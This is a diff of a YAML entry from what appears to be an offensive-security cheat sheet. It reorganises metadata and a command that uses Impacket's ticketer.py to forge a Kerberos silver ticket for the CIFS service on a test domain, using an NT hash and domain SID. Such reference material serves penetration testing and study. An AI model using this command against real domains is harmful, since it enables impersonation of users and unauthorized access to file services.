@@ -16,21 +16,16 @@ description: |
 
   	SMB Service: cifs
 
+command: |
+  python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
 items:
-  Username:
-    - code: |
-        python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
-  Hash:
-    - code: |
-        empty
-filters:
-  Kerberos:
-    - code: |
-        empty
-  Linux:
-    - code: |
-        empty
-  Windows:
-    - code: |
-        empty
+  - Username
+  - Hash
+services:
+  - Kerberos
+OS:
+  - Linux
+  - Windows
+attack_types:
+  - Exploitation
 ---
